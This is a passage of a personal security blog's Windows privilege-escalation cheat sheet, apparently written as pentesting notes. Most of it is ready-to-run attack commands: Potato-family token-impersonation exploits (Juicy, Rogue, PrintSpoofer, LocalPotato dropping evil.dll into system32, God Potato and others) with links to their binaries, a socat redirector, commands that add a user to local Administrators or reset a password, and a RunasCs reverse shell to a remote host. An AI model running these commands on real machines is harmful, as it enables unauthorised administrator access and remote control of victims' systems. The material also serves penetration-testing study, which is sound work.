+<p>Launch an <strong>Hot Potato</strong> attack from a low privileged user (binary <a href="https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\p</span>otato.exe<span class="w"> </span>-ip<span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span><span class="w"> </span>-enable_httpserver<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_defender<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_spoof<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_exhaust<span class="w"> </span><span class="nb">true</span>
+</code></pre></div>
+<p>Launch a <strong>Rotten Potato</strong> attack from a account with token impersonation privileges <code>meterpreter</code> shell with <em>incognito mode</em> enabled (binary <a href="https://github.com/breenmachine/RottenPotatoNG">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\M</span>SFRottenPotato.exe<span class="w"> </span>t<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;
+</code></pre></div>
+<p>Launch a Juicy Potato attack from a service account shell (binary <a href="https://github.com/ohpe/juicy-potato/tree/master">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\J</span>uicyPotato.exe<span class="w"> </span>-l<span class="w"> </span><span class="m">1337</span><span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run<span class="w"> </span>-<span class="w"> </span>absolute<span class="w"> </span>path&gt;<span class="w"> </span>-t<span class="w"> </span>*<span class="w"> </span>-c<span class="w"> </span>&lt;CLSDID&gt;
+</code></pre></div>
+<p>where <code>CLSID</code> can be one from <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">this list</a> or one from the <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a> script.</p>
+<p>Launch a <strong>Rogue Potato</strong> attack; first start a socat listener forwarding port <code>135</code> on the attacker machine to a victim host unused port, for example <code>9999</code>:</p>
+<div class="highlight"><pre><span></span><code>socat<span class="w"> </span>tcp-listen:135,reuseaddr,fork<span class="w"> </span>tcp:&lt;victim<span class="w"> </span>ip&gt;:9999
+</code></pre></div>
+<p>Run the exploit from an account with token impersonation privileges shell (binary <a href="https://github.com/antonioCoco/RoguePotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>oguePotato.exe<span class="w"> </span>-r<span class="w"> </span>&lt;attacker<span class="w"> </span>ip&gt;<span class="w"> </span>-e<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span><span class="w"> </span>-l<span class="w"> </span><span class="m">9999</span>
+</code></pre></div>
+<p>Run a <strong>Print Spoofer</strong> attack from an account with token impersonation privileges shell (binary <a href="https://github.com/itm4n/PrintSpoofer">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\P</span>rintSpoofer.exe<span class="w"> </span>&ndash;i<span class="w"> </span>-c<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span>
+</code></pre></div>
+<p>Run a <strong>LocalPotato</strong> attack from an account with token impersonation privileges shell  (binary <a href="https://github.com/decoder-it/LocalPotato?tab=readme-ov-file">here</a>):</p>
+<div class="highlight"><pre><span></span><code># SMB Scenario
+LocalPotato.exe -i c:\hacker\evil.dll -o windows\system32\evil.dll
+
+# WebDAV
+LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
+</code></pre></div>
+<p>Run <strong>Sweet Potato</strong> from an account with token impersonation privileges shell  (binary <a href="https://github.com/CCob/SweetPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\S</span>weetPotato.exe<span class="w"> </span>-c<span class="w"> </span>&lt;CLSDID&gt;<span class="w"> </span>-m<span class="w"> </span>&lt;method&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;<span class="w"> </span>-a<span class="w"> </span>&lt;args<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>executable&gt;<span class="w"> </span>-e<span class="w"> </span>&lt;exploit<span class="w"> </span>mode&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;COM<span class="w"> </span>listen<span class="w"> </span>port&gt;
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>CLSDID</code>: see Juicy Potato - default is BITS <code>{4991D34B-80A1-4291-83B6-3328366B9097}</code></li>
+<li><code>method</code>: one of <code>Auto</code>, <code>User</code>or <code>Thread</code></li>
+<li><code>exploit mode</code>: one of <code>DCOM</code>, <code>WinRM</code>, <code>EfsRpc</code> or <code>PrintSpoofer</code> (default)</li>
+<li><code>COM listen port</code>: default 6666</li>
+</ul>
+<p>Run <strong>Generic Potato</strong> from an account with token impersonation privileges shell  (binary <a href="https://github.com/micahvandeusen/GenericPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\G</span>enericPotato.exe<span class="w"> </span>-m<span class="w"> </span>&lt;method&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;<span class="w"> </span>-a<span class="w"> </span>&lt;args<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>executable&gt;<span class="w"> </span>-e<span class="w"> </span>&lt;exploit<span class="w"> </span>mode&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;HTTP<span class="w"> </span>listen<span class="w"> </span>port&gt;<span class="w"> </span>-i<span class="w"> </span>&lt;HTTP<span class="w"> </span>listen<span class="w"> </span>host&gt;
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>method</code>: one of <code>Auto</code>, <code>User</code>or <code>Thread</code></li>
+<li><code>exploit mode</code>: one of <code>HTTP</code> or <code>NamedPipe</code> (default)</li>
+<li><code>HTTP listen port</code>: default 8888</li>
+<li><code>HTTP listen host</code>: default 127.0.0.1</li>
+</ul>
+<p>Run a <strong>God Potato</strong> attack from an account with token impersonation privileges shell  (binary <a href="https://github.com/BeichenDream/GodPotato">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\G</span>odPotato<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"&lt;command to run&gt;"</span>
+</code></pre></div>
+<h2 id="misc">Misc</h2>
+<p>Add user to local Administrators group:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>localgroup<span class="w"> </span>administrators<span class="w"> </span>&lt;user&gt;<span class="w"> </span>/add
+</code></pre></div>
+<p>Change user password:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;new<span class="w"> </span>password&gt;
+</code></pre></div>
+<p>Run command as user with <strong>Full Profile</strong> using <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>:</p>
+<div class="highlight"><pre><span></span><code>RunasCs.exe<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;password&gt;<span class="w"> </span><span class="s2">"&lt;command&gt;"</span>
+</code></pre></div>
+<p>Open reverse shell with <code>RunasCs</code>:</p>
+<div class="highlight"><pre><span></span><code>RunasCs.exe<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;password&gt;<span class="w"> </span>cmd.exe<span class="w"> </span>-r<span class="w"> </span>&lt;remote<span class="w"> </span>host&gt;:&lt;remote<span class="w"> </span>port&gt;
+</code></pre></div>
+<p>Window's <code>grep</code> equivalent (<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490907(v=technet.10)?redirectedfrom=MSDN">findstr</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="o">&lt;</span><span class="n">regex</span><span class="o">&gt;</span>
+<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">r</span><span class="w"> </span><span class="o">&lt;</span><span class="n">regex</span><span class="o">&gt;</span>
+
+<span class="p">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
+<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
+</code></pre></div>
+<h3 id="efs-encryption">EFS Encryption</h3>
+<p>See <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation.html#efs-encryption">Windows Privilege Escalation - EFS Encryption</a>.</p>
+<p>Decrypt the file:</p>
+<div class="highlight"><pre><span></span><code>cipher<span class="w"> </span>/d<span class="w"> </span><span class="s2">"&lt;path to encrypted file&gt;"</span>
+</code></pre></div>
+<p>You can also decrypt a whole folder:</p>
+<div class="highlight"><pre><span></span><code>cipher<span class="w"> </span>/d<span class="w"> </span>/s:<span class="s2">"&lt;path to encrypted files folder&gt;"</span>
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
